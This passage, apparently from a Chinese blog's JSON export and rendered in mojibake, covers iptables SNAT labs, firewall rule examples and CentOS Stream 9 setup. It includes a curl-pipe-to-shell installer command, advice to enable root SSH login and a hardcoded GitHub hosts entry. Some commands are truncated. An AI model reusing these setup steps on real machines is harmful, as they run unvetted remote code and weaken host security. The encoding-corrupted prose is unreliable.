æŸ¥çœ‹æ•ˆæœ 1sudo iptables -t nat -L æµ‹è¯•ç»“æœå†…ç½‘å®¢æˆ·æœºï¼Œå¯ä»¥pingé€šå¤–ç½‘æœºå™¨ï¼ˆiptableså†™çš„icmpçš„åè®®ï¼‰ æŠ“åŒ…åˆ†æä¸ºäº†éªŒè¯å†…ç½‘æœºå™¨ubuntuå»è®¿é—®å¤–ç½‘çš„macOSæ—¶ï¼Œæ˜¯å¦è¿›è¡Œäº†æ­£ç¡®çš„åœ°å€è½¬æ¢ï¼Œå¯¹macOSè¿›è¡ŒæŠ“åŒ…ï¼Œçœ‹ä»ubuntuè¿‡æ¥çš„IPæ˜¯ä¸æ˜¯é¢„æ–™ä¸­çš„192.168.117.1 Ubuntuå‘èµ·pingï¼Œå¯¹macOSçš„eth0æŠ“åŒ…ï¼Œè¿‡æ»¤icmp å¯ä»¥çœ‹åˆ°å¤šæ¡æ¥è‡ª192.168.117.1ï¼Œç›®çš„ä¸º192.168.117.2 çš„ICMPåŒ…ã€‚ å®éªŒæˆåŠŸï¼ å‚è€ƒæ–‡ç« [æ¸—é€æµ‹è¯•]è™šæ‹Ÿæœºæ­å»ºå†…å¤–ç½‘ç¯å¢ƒ SNAT&#x2F;DNATç­–ç•¥ vmwareæ­å»ºå¤šå°Linuxè™šæ‹Ÿæœºå†…ç½‘ç¯å¢ƒ é…ç½®ç½‘å…³ NAT","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"iptables","slug":"å…¥ä¾µæ£€æµ‹/iptables","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/iptables/"}],"tags":[{"name":"iptables","slug":"iptables","permalink":"https://gryffinbit.top/tags/iptables/"},{"name":"SNAT","slug":"SNAT","permalink":"https://gryffinbit.top/tags/SNAT/"}],"author":"Gryffinbit"},{"title":"iptablesç­–ç•¥å®éªŒ","slug":"iptablesç­–ç•¥å®éªŒ","date":"2022-07-21T16:47:42.000Z","updated":"2024-11-12T06:59:39.000Z","comments":true,"path":"2022/07/22/iptablesç­–ç•¥å®éªŒ/","permalink":"https://gryffinbit.top/2022/07/22/iptables%E7%AD%96%E7%95%A5%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"å‰è¨€iptablesç­–ç•¥è¯¦è§£è·³è½¬blogï¼šiptableså¸¸ç”¨ç­–ç•¥ é˜²ç«å¢™ä¼šæŒ‰ç…§ä»ä¸Šåˆ°ä¸‹çš„é¡ºåºæ¥è¯»å–é…ç½®çš„ç­–ç•¥è§„åˆ™ï¼Œåœ¨æ‰¾åˆ°åŒ¹é…é¡¹åå°±ç«‹å³ç»“æŸåŒ¹é…å·¥ä½œå¹¶å»æ‰§è¡ŒåŒ¹é…é¡¹ä¸­å®šä¹‰çš„è¡Œä¸ºï¼ˆå³æ”¾è¡Œæˆ–é˜»æ­¢ï¼‰ã€‚å¦‚æœåœ¨è¯»å–å®Œæ‰€æœ‰çš„ç­–ç•¥è§„åˆ™ä¹‹åæ²¡æœ‰åŒ¹é…é¡¹ï¼Œå°±å»æ‰§è¡Œé»˜è®¤çš„ç­–ç•¥ã€‚ å®éªŒç¯å¢ƒï¼ˆä¸¤å°è®¾å¤‡ä¹‹é—´è¿›è¡Œäº¤äº’æ—¶ï¼‰CentOSï¼šCentOS-Stream-9-latest-aarch64-dvd1 ã€parallels desktop17 è™šæ‹Ÿæœºã€‘ CentOSçš„ iptablesç‰ˆæœ¬ï¼šiptables v1.8.8 (nf_tables) CentOS wireshark å®¢æˆ·ç«¯ç‰ˆæœ¬ï¼šVersion 3.4.10 macOS: macOS Monterey. M1, 2020, ARM64 ã€ç‰©ç†æœºã€‘ å®éªŒæ€è·¯ åœ¨CentOSä¸Šé¢è¿›è¡Œiptablesçš„ç­–ç•¥éƒ¨ç½²ï¼Œä½¿ç”¨macOSå‘é€æ•°æ®åŒ…æ¥è¿›è¡Œç­–ç•¥çš„æµ‹è¯•ã€‚åœ¨CentOSä¸ŠæŠ“åŒ…ï¼Œå¯¹è¿›å…¥çš„æ•°æ®åŒ…åˆ†æã€‚ IPé…ç½® macOS CentOS 192.168.117.2 10.211.55.12 æœªé…ç½®é˜²ç«å¢™ç­–ç•¥æ—¶ç½‘è·¯è¿æ¥æƒ…å†µ CentOSé‡‡ç”¨å…±äº«ç½‘ç»œæ¨¡å¼ CentOSå’ŒmacOSä¹‹é—´å¯ä»¥ç›¸äº’pingé€š å®éªŒç¯å¢ƒï¼ˆä¸‰å°è®¾å¤‡ä¹‹é—´äº¤äº’ï¼Œéœ€è¦NAT serverè½¬å‘æ—¶ï¼‰é‡‡ç”¨SNATç¯å¢ƒã€‚è§blogï¼šiptablesé…ç½®SNATå®ç°å…±äº«ä¸Šç½‘ IPé…ç½® macOS centOS Ubuntu 172.20.10.2 å¤–ç½‘ç½‘å¡ï¼š172.20.10.1 å†…ç½‘ç½‘å¡ï¼š 10.37.129.1 10.37.129.6 å¸¸ç”¨çš„ç­–ç•¥ç®¡ç†æŸ¥çœ‹è·¯ç”±ä¿¡æ¯ 1sudo iptables -t nat -L æŸ¥çœ‹iptableså·²ç»è®¾ç½®çš„ç­–ç•¥ 1sudo iptables -L åˆ—å‡ºè§„åˆ™çš„è¡Œå· 1sudo iptables -nL --line-number åˆ é™¤ç‰¹å®šçš„è¡Œè§„åˆ™ 12# åˆ é™¤INPUTé“¾ä¸­ï¼Œç¬¬äºŒæ¡è§„åˆ™sudo iptables -D INPUT 2 åˆ é™¤å…¨éƒ¨è§„åˆ™ 12# åˆ é™¤natè¡¨é‡Œæ‰€æœ‰è§„åˆ™sudo iptables -t nat -F æ°¸ä¹…å†™å…¥ 1service iptables save å®éªŒç­–ç•¥ æ‹’ç»è¿›å…¥é˜²ç«å¢™çš„æ‰€æœ‰ICMPåè®®æ•°æ®åŒ… 1sudo iptables -I INPUT -p icmp -j REJECT -I é»˜è®¤å°†è§„åˆ™æ·»åŠ åˆ°ç¬¬ä¸€è¡Œ macOS æ— æ³•pingé€š å…è®¸é˜²ç«å¢™è½¬å‘é™¤ICMPåè®®ä»¥å¤–çš„æ‰€æœ‰æ•°æ®åŒ… 1sudo iptables -A FORWARD -p icmp -j REJECT é…ç½®è¿™æ¡è§„åˆ™ä¹‹å‰ï¼Œå¯ä»¥pingé€šMACOSï¼ˆweb serverï¼‰ã€‚é…ç½®ä¹‹åå°±æ— æ³•pingé€šäº†ã€‚å› ä¸ºæ‹’ç»äº†icmpåŒ… æ‹’ç»è½¬å‘æ¥è‡ª10.37.129.7ä¸»æœºçš„æ•°æ®ã€‚å…è®¸è½¬å‘æ¥è‡ª10.37.129.0&#x2F;24ç½‘æ®µçš„æ•°æ® å¼€ä¸€å°æ–°çš„è™šæ‹Ÿæœºkaliï¼ŒIPè®¾ç½®ä¸º10.37.129.7ï¼Œç½‘å…³è®¾ç½®ä¸º 10.37.129.1 1sudo iptables -I FORWARD -s åªå…è®¸ç®¡ç†å‘˜ä»202.13.0.0&#x2F;16ç½‘æ®µä½¿ç”¨SSHè¿œç¨‹ç™»å½•é˜²ç«å¢™ä¸»æœºã€‚ 1iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPT 1iptables -A INPUT -p tcp --dport 22 -j DROP ç¦æ­¢å…¶ä»–ä¸»æœºpingé˜²ç«å¢™ä¸»æœºï¼Œä½†æ˜¯å…è®¸ä»é˜²ç«å¢™ä¸Špingå…¶ä»–ä¸»æœº 1iptables -I INPUT -p icmp --icmp-type 8/0 -j REJECT ç¦æ­¢è½¬å‘æ¥è‡ªMACåœ°å€ä¸º00ï¼š0Cï¼š29ï¼š27ï¼š55ï¼š3Fçš„å’Œä¸»æœºçš„æ•°æ®åŒ… 1iptables -A FORWARD -m mac --mac-source 00ï¼š0Cï¼š29ï¼š27ï¼š55ï¼š3F -j DROP","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"iptables","slug":"å…¥ä¾µæ£€æµ‹/iptables","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/iptables/"}],"tags":[{"name":"iptables","slug":"iptables","permalink":"https://gryffinbit.top/tags/iptables/"}],"author":"Gryffinbit"},{"title":"centOS-Stream9ARMåŸºç¡€é…ç½®","slug":"centOS-Stream9ARMåŸºç¡€é…ç½®","date":"2022-07-20T14:21:20.000Z","updated":"2024-11-12T06:59:47.000Z","comments":true,"path":"2022/07/20/centOS-Stream9ARMåŸºç¡€é…ç½®/","permalink":"https://gryffinbit.top/2022/07/20/centOS-Stream9ARM%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/","excerpt":"","text":"ä¸€ä¸ªç»†èŠ‚å‘ç°æºé‡Œé¢ç»å¸¸ä¼šæœ‰è¿™ç§å˜é‡ï¼š 1https://mirrors.aliyun.com/centos-stream/$stream/AppStream/$basearch/os/ $basearch çš„å€¼ï¼Œç³»ç»Ÿç¡¬ä»¶æ¶æ„(CPUæŒ‡ä»¤é›†) æ¶æ„æ˜¯aarch64 $stream çš„å€¼ï¼Œå°±æ˜¯ç³»ç»Ÿç‰ˆæœ¬äº† ç‰ˆæœ¬æ˜¯CentOS Stream release 9 åœ°å€ä»£å…¥è¯¥ç³»ç»Ÿå˜é‡åçš„è·¯å¾„å°±æ˜¯ 1https://mirrors.aliyun.com/centos-stream/9-stream/AppStream/aarch64/os/ æ‰“å¼€ssh1sudo vim /etc/ssh/sshd_config å°†PermitRootLogin prohibit-passwordé‚£ä¸€è¡Œä¿®æ”¹ä¸ºPermitRootLogin yesï¼Œå»æ‰å‰é¢çš„#å· å°†port 22å‰é¢çš„#å»æ‰ æ›´æ¢æºå¤‡ä»½ 1sudo mv /etc/yum.repos.d/centos.repo /etc/yum.repos.d/centos.repo.backup æ¢æˆé˜¿é‡Œæº 1sudo vi /etc/yum.repos.d/centos.repo 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# CentOS-Base.repo## The mirror system uses the connecting IP address of the client and the# update status of each mirror to pick mirrors that are updated to and# geographically close to the client. You should use this for CentOS updates# unless you are manually picking other mirrors.## If the mirrorlist= does not work for you, as a fall back you can try the # remarked out baseurl= line instead.## [base]name=CentOS-$releasever - Base - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/BaseOS/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/BaseOS/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/BaseOS/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official #additional packages that may be useful#[extras]#name=CentOS-$releasever - Extras - mirrors.aliyun.com#failovermethod=priority#baseurl=https://mirrors.aliyun.com/centos-stream/$stream/extras/$basearch/os/# http://mirrors.aliyuncs.com/centos-stream/$stream/extras/$basearch/os/# http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/extras/$basearch/os/#gpgcheck=1#gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official #additional packages that extend functionality of existing packages[centosplus]name=CentOS-$releasever - Plus - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/centosplus/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/centosplus/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/centosplus/$basearch/os/gpgcheck=1enabled=0gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official[PowerTools]name=CentOS-$releasever - PowerTools - mirrors.aliyun.comfailovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/PowerTools/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/PowerTools/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/PowerTools/$basearch/os/gpgcheck=1enabled=0gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official[AppStream]name=CentOS-$releasever - AppStream - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/AppStream/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/AppStream/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/AppStream/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official 123yum clean allyum makecache sudo yum update å¦‚æœæƒ³ä½¿ç”¨dnfçš„è¯ï¼Œä½¿dnfçš„æºä¹Ÿæ›´æ–° 1sudo dnf makecache æ·»åŠ CRBä»“åº“ 1vim /etc/yum.repos.d/centos.repo æœ€åä¸€è¡ŒåŠ å…¥ 12345678[crb]name = =CentOS-$releasever - CRB - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official 12dnf makecacheyum makecache ç”¨crbä¸‹è½½ 1dnf --enablerepo=crb install &lt;åŒ…å&gt; -y å¯ä»¥é€šè¿‡https://pkgs.org/æ¥æŸ¥çœ‹è¦ä¸‹è½½çš„åŒ…ï¼Œæ˜¯å±äºå“ªä¸ªä»“åº“æºçš„ å®‰è£…vim1sudo yum search vim 1sudo yum install vim-enhanced.aarch64 å®‰è£…oh-my-zshå®‰è£…git 12sudo yum search gitsudo yum install git.aarch64 å®‰è£…zsh 1sudo yum install zsh æ›´æ”¹é»˜è®¤shell 1chsh -s /usr/bin/zsh github 443æ‹’ç»è®¿é—® 1sudo vim /etc/hosts åŠ å…¥ 1192.30.255.113 github.com å°±å¯ä»¥pingé€šäº† å®‰è£…oh-my-zshï¼ˆä¸èƒ½ç”¨sshï¼‰ 1sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot; ç½‘ä¸å¥½çš„æƒ…å†µä¸‹ï¼Œå°±æŠŠè„šæœ¬å†…å®¹å¤åˆ¶è¿‡æ¥ï¼Œåœ¨é‡Œé¢è£… 123vim install.shchmod +x install.shsudo ./install.sh é…ç½®æ–‡ä»¶ 1vim ~/.zshrc ä¿®æ”¹ä¸»é¢˜ ä¿®æ”¹è¿™ä¸€è¡ŒZSH_THEME=&quot;robbyrussell&quot;å°†ä¸»é¢˜ä¿®æ”¹ä¸ºè‡ªå·±å–œæ¬¢çš„ 1ZSH_THEME=&quot;agnoster&quot; é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ 1source ~/.zshrc ä¸‹è½½æ’ä»¶ è‡ªåŠ¨æç¤º 1git clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions è¯­æ³•é«˜äº® 1git clone https://github.com/zsh-users/zsh-syntax-highlighting ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting 1echo &quot;source ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh&quot; &gt;&gt; ~/.zshrc ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œç”Ÿæ•ˆæ’ä»¶ 1vim ~/.zshrc æ‰¾åˆ°æ’ä»¶ä½ç½®ï¼Œæ·»åŠ åˆšåˆšçš„æ’ä»¶ 1source ~/.zshrc æ”¹è‡ªåŠ¨æç¤ºé¢œè‰²ã€äº®åº¦ PSï¼šå¦‚æœé‡æ–°æ‰“å¼€ç»ˆç«¯çœ‹ä¸åˆ°è‡ªåŠ¨æç¤ºï¼Œå¯èƒ½æ˜¯ç»ˆç«¯çš„å­—ä½“é¢œè‰²å¤ªæ·¡äº†ï¼Œå¯ä»¥é€šè¿‡ğŸ‘‡é…ç½®æŠŠå­—ä½“æ”¹äº®ä¸€äº›ï¼š 1cd ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions ä¿®æ”¹è‡ªåŠ¨æç¤ºç›¸å…³çš„é…ç½®æ–‡ä»¶ï¼šZSH_AUTOSUGGEST_HIGHLIGHT_STYLE=&#39;fg=10&#39; 12vi zsh-autosuggestions.zshsource ~/.zshrc ä¿®æ”¹ä¸»é¢˜ç›®å½•é¢œè‰² 1sudo vim ~/.oh-my-zsh/themes/agnoster.zsh-theme","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"centOS-Stream","slug":"centOS-Stream","permalink":"https://gryffinbit.top/tags/centOS-Stream/"}],"author":"Gryffinbit"},{"title":"iptableså¸¸ç”¨ç­–ç•¥","slug":"iptableså¸¸ç”¨ç­–ç•¥","date":"2022-07-19T17:54:49.000Z","updated":"2024-11-12T06:59:38.000Z","comments":true,"path":"2022/07/20/iptableså¸¸ç”¨ç­–ç•¥/","permalink":"https://gryffinbit.top/2022/07/20/iptables%E5%B8%B8%E7%94%A8%E7%AD%96%E7%95%A5/","excerpt":"","text":"å‰è¨€iptablesè¯¦è§£è·³è½¬blogï¼šiptablesä»‹ç» iptablesç®¡ç†å’Œè§„åˆ™è·³è½¬blogï¼špiptablesç®¡ç†å’Œè§„åˆ™ iptablesæ–‡æ¡£ï¼šiptables(8) - Linux man page iptablesæŒ‡å—ï¼šiptables-tutorial é˜²ç«å¢™å¸¸ç”¨ç­–ç•¥æ‹’ç»è¿›å…¥é˜²ç«å¢™çš„æ‰€æœ‰ICMPåè®®æ•°æ®åŒ…w 1iptables -I INPUT -p icmp -j REJECT -I : åœ¨æŒ‡å®šé“¾ä¸­æ’å…¥ä¸€æ¡è§„åˆ™ï¼Œé»˜è®¤ç¬¬ä¸€è¡Œï¼Œ INPUTé“¾ï¼šè¿›å…¥é˜²ç«å¢™çš„å¿…ç»ä¹‹é“¾ï¼Œ -p é€‰æ‹©åè®® -j å¯¹æ•°æ®åŒ…æ‰§è¡Œçš„æ“ä½œ å…è®¸é˜²ç«å¢™è½¬å‘é™¤ICMPåè®®ä»¥å¤–çš„æ‰€æœ‰æ•°æ®åŒ… 1iptables -A FORWARD -p !icmp -j ACCEPT -Aï¼šåœ¨æŒ‡å®šé“¾çš„æœ«å°¾æ·»åŠ ï¼ˆappendï¼‰ä¸€æ¡æ–°çš„è§„åˆ™ æ‹’ç»è½¬å‘æ¥è‡ª192.168.1.10ä¸»æœºçš„æ•°æ®ã€‚å…è®¸è½¬å‘æ¥è‡ª192.168.0.0&#x2F;24ç½‘æ®µçš„æ•°æ® 1iptables -A FORWARD -s 192.168.1.10 -j REJECT 1iptables -A FORWARD -s 192.168.0.0/24 -j ACCEPT âš ï¸æ³¨æ„è¦æŠŠæ‹’ç»çš„æ”¾åœ¨å‰é¢ï¼Œä¸ç„¶æ— æ³•èµ·ä½œç”¨ã€‚ ä¸¢å¼ƒä»å¤–ç½‘æ¥å£ï¼ˆeth1ï¼‰è¿›å…¥é˜²ç«å¢™æœ¬æœºçš„æºåœ°å€ä¸ºç§ç½‘åœ°å€çš„æ•°æ®åŒ… 123iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROPiptables -A INPUT -i eth1 -s 172.16.0.0/12 -j DROPiptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROP ç§ç½‘åœ°å€èŒƒå›´ Aç±»åœ°å€ï¼š10.0.0.0ï½10.255.255.255. Bç±»åœ°å€ï¼š172.16.0.0 ï½172.31.255.255. Cç±»åœ°å€ï¼š192.168.0.0ï½192.168.255.255. åªå…è®¸ç®¡ç†å‘˜ä»202.13.0.0&#x2F;16ç½‘æ®µä½¿ç”¨SSHè¿œç¨‹ç™»å½•é˜²ç«å¢™ä¸»æœºã€‚ 1iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPT 1iptables -A INPUT -p tcp --dport 22 -j DROP SSHä½¿ç”¨çš„ä¼ è¾“å±‚åè®®æ˜¯TCP SSHæœåŠ¡å¼€æ”¾22ç«¯å£ï¼Œ-dport num åŒ¹é…ç›®æ ‡ç«¯å£å· å…è®¸æœ¬æœºå¼€æ”¾ä»TCPç«¯å£20-1024æä¾›çš„åº”ç”¨æœåŠ¡ 1iptables -A INPUT -p tcp --dport 20:1024 -j ACCEPT 1iptables -A OUTPUT -p tcp --sport 20:1024 -j ACCEPT ç«¯å£èŒƒå›´çš„è¡¨ç¤ºæ–¹å¼ï¼š20-1024çš„è¡¨ç¤ºæ–¹å¼ï¼Œ20:1024 å…è®¸å¼€æ”¾è¿™ä¸ªèŒƒå›´çš„æœåŠ¡ï¼Œæµé‡ä¸æ­¢è¦èƒ½è¿›æ¥ï¼Œè¿˜è¦è¿›æ¥ä¹‹åèƒ½é¡ºåˆ©æµå‡ºã€‚æ‰€ä»¥è¿˜è¦åˆ¶å®šOUTPUTé“¾çš„è§„åˆ™ã€‚ å…è®¸è½¬å‘æ¥è‡ª192.168.0.0&#x2F;24å±€åŸŸç½‘æ®µçš„DNSè§£æè¯·æ±‚æ•°æ®åŒ… 1iptables -A FORWARD -s 192.168.0.0/24 -p udp --dport 53 -j ACCEPT 1iptables -A FORWARD -d 192.168.0.0/24 -p udp --sport 53 -j ACCEPT è½¬å‘è¿™ä¸€ç½‘æ®µçš„è¯·æ±‚ï¼Œä¹Ÿæ˜¯è¦æ±‚èƒ½å¤Ÿæœ‰è¿›æœ‰å‡ºã€‚ -d å’Œ --sportæ€»æ˜¯æˆå¯¹å‡ºç° DNSè§£æï¼Œä½¿ç”¨çš„ä¼ è¾“å±‚åè®®æ˜¯UDP DNSæœåŠ¡å¼€æ”¾ç«¯å£å·æ˜¯53å·ç«¯å£ æ‰©å±•æ¨¡å— iptableså®˜æ–¹æ–‡æ¡£è¯´æ˜ æ‰©å±•æ¨¡å—ç›¸å…³å†…å®¹ï¼Œç« èŠ‚10ä¸­è¯¦ç»†ä»‹ç»äº†ã€‚ æ¯”è¾ƒå¸¸ç”¨çš„æ‰©å±•ï¼š Iptables -må‚æ•° ç”¨æ³•ï¼š 1-m æ¨¡å—å…³é”®å­— æ‰©å±•æ¨¡å—ï¼š iprangeï¼šå¯ä»¥æŒ‡å®šä¸€æ®µè¿ç»­çš„IPåœ°å€èŒƒå›´ï¼Œç”¨äºåŒ¹é…æŠ¥æ–‡çš„æºåœ°å€æˆ–ç›®çš„åœ°å€ --src-range åŒ¹é…æŠ¥æ–‡çš„æºåœ°å€æ‰€åœ¨èŒƒå›´ --dst-range åŒ¹é…æŠ¥æ–‡çš„ç›®æ ‡åœ°å€æ‰€åœ¨èŒƒå›´ 1iptables -t filter -I INPUT -m iprange --src-range 192.168.1.15-192.168.1.149 -j REJECT stringï¼šå¯ä»¥æŒ‡å®šè¦åŒ¹é…çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæŠ¥æ–‡ä¸­åŒ…å«å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œåˆ™ç¬¦åˆåŒ¹é…æ¡ä»¶ã€‚ å¦‚ï¼šå¦‚æœæŠ¥æ–‡ä¸­åŒ…å«å­—ç¬¦â€œhelloâ€ï¼Œå°±ä¸¢å¼ƒå½“å‰æŠ¥æ–‡ 1iptables -t filter -I INPUT -m string --algo bm --string &quot;hello&quot; -j REJECT -m stringè¡¨ç¤ºä½¿ç”¨stringæ¨¡å—ï¼Œ--algo bmè¡¨ç¤ºä½¿ç”¨bmç®—æ³•å»åŒ¹é…æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œ--string &quot;OOXX&quot; åˆ™è¡¨ç¤ºæˆ‘ä»¬æƒ³è¦åŒ¹é…çš„å­—ç¬¦ä¸²ä¸ºâ€helloâ€ timeï¼š æ ¹æ®æ—¶é—´æ®µåŒºåŒ¹é…æŠ¥æ–‡ï¼Œå¦‚æœæŠ¥æ–‡åˆ°è¾¾çš„æ—¶é—´åœ¨æŒ‡å®šçš„æ—¶é—´èŒƒå›´ä»¥å†…ï¼Œåˆ™ç¬¦åˆåŒ¹é…æ¡ä»¶ã€‚ æ¯”å¦‚:æ¯å¤©æ—©ä¸Š9ç‚¹åˆ°ä¸‹åˆ6ç‚¹ä¸èƒ½çœ‹ç½‘é¡µ 1iptables -I OUTPUT -p tcp --dport 80 -m time --timestart 09:00:00 --timestop 18:00:00 -j REJECT ç¦æ­¢å…¶ä»–ä¸»æœºpingé˜²ç«å¢™ä¸»æœºï¼Œä½†æ˜¯å…è®¸ä»é˜²ç«å¢™ä¸Špingå…¶ä»–ä¸»æœº 1iptables -I INPUT -p icmp --icmp-type 8/0 -j REJECT æˆ–è€… 1iptables -I INPUT -p icmp --icmp-type &quot;echo-request&quot; -j REJECT ping ä½¿ç”¨çš„ç½‘ç»œå±‚åè®®æ˜¯icmp æµé‡è¦ä¸€å¼€å§‹å°±è¢«åŠæ—¶åˆ¶æ­¢ï¼Œæ‰€ä»¥ç”¨-I å‚æ•°ï¼Œå°†è§„åˆ™æ·»åŠ åˆ°ç¬¬ä¸€è¡Œ Icmpæ‰©å±•åŒ¹é…æ¡ä»¶ï¼š icmpåè®®ç±»å‹æœ‰å¾ˆå¤šç§ï¼Œéƒ½æœ‰å¯¹åº”çš„typeç ï¼Œæ¯ç§typeç åˆæœ‰å¯¹åº”çš„codeã€‚é€šå¸¸ä½¿ç”¨type/codeå»åŒ¹é…å…·ä½“ç±»å‹çš„ICMPæŠ¥æ–‡ã€‚ä½¿ç”¨--icmp-typeè¡¨ç¤ºæ ¹æ®å…·ä½“çš„typeä¸codeå»åŒ¹é…å¯¹åº”çš„icmpæŠ¥æ–‡ã€‚-m icmp è¡¨ç¤ºä½¿ç”¨icmpæ‰©å±•ã€‚å¦‚æœå·²ç»ä½¿ç”¨äº†-p icmpåˆ™å¯ä»¥çœç•¥-m icmp æ¯”å¦‚--icmp-type 8/0è¡¨ç¤ºåªæœ‰pingè¯·æ±‚ç±»å‹çš„æŠ¥æ–‡æ‰èƒ½è¢«åŒ¹é…åˆ°ã€‚ä¹Ÿå°±æ˜¯è¯´åˆ«äººå¯¹æˆ‘ä»¬å‘èµ·çš„pingè¯·æ±‚å°†ä¼šè¢«æ‹’ç»é€šè¿‡é˜²ç«å¢™ï¼Œè€Œæˆ‘ä»¬å¯ä»¥pingé€šåˆ«äººã€‚å› ä¸ºåˆ«äººå›åº”æˆ‘ä»¬çš„æŠ¥æ–‡icmp type ä¸º0ï¼Œcodeä¹Ÿä¸º0ã€‚ é™¤äº†ç”¨type codeçš„æ•°å­—è¡¨ç¤ºï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ–‡å­—çš„æè¿°ã€‚ç›´æ¥å¡«å†™descriptionä¸­çš„å†…å®¹è¡¨è¿°å°±å¯ä»¥äº†ã€‚æ¯”å¦‚ --icmp-type 8/0 å¯ä»¥ç”¨ä»¥ä¸‹çš„æ–¹å¼è¡¨ç¤ºã€‚ç©ºæ ¼ç”¨-è¡¨ç¤º 1--icmp-type &quot;echo-request&quot; è¿˜æœ‰udpçš„æ‰©å±•ï¼š udpæ‰©å±•ï¼Œä½¿ç”¨-sportå’Œ-dportæ¥åŒ¹é…UDPåè®®æŠ¥æ–‡çš„æºç«¯å£ä¸ç›®çš„ç«¯å£ã€‚ æ¯”å¦‚æ”¾è¡ŒsambaæœåŠ¡çš„137ä¸138ä¸¤ä¸ªUDPç«¯å£ã€‚ 1iptables -I INPUT -p udp --dport 137 -j ACCEPT 1iptables -I INPUT -p udp --dport 138 -j ACCEPT ç¦æ­¢è½¬å‘æ¥è‡ªMACåœ°å€ä¸º00ï¼š0Cï¼š29ï¼š27ï¼š55ï¼š3Fçš„å’Œä¸»æœºçš„æ•°æ®åŒ… 1iptables -A FORWARD -m mac --mac-source 00ï¼š0Cï¼š29ï¼š27ï¼š55ï¼š3F -j DROP åœ¨æ–‡æ¡£é‡ŒåŒ¹é…macï¼Œæ‰¾åˆ°æƒ³è¦çš„å†…å®¹ ![Screen Shot 2022-07-19 at 11.30.30](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;Screen Shot 2022-07-19 at 11.30.30.png) å…è®¸é˜²ç«å¢™æœ¬æœºå¯¹å¤–å¼€æ”¾TCPç«¯å£20ã€21ã€25ã€110ä»¥åŠè¢«åŠ¨æ¨¡å¼FTPç«¯å£1250-1280 1iptables -A INPUT -p tcp -m multiport --dport 20,21,25,110,1250:1280 -j ACCEPT åœ¨æ–‡æ¡£é‡ŒåŒ¹é…TCPï¼Œæ‰¾åˆ°æƒ³è¦çš„å†…å®¹ï¼Œå…¶ä¸­åœ¨dporté€‰é¡¹é‡Œæåˆ°äº†multiportï¼Œäºæ˜¯å†å»æ‰¾multiportçš„æ‰©å±•åŒ¹é… ![Screen Shot 2022-07-19 at 11.45.44](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;Screen Shot 2022-07-19 at 11.45.44.png) multiportæ‰©å±• ![Screen Shot 2022-07-19 at 11.50.51](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;Screen Shot 2022-07-19 at 11.50.51.png) ç¦æ­¢è½¬å‘æºIPåœ°å€ä¸º192.168.1.20-192.168.1.99çš„TCPæ•°æ®åŒ… 1iptables -A FORWARD -p tcp -m iprange --src-range 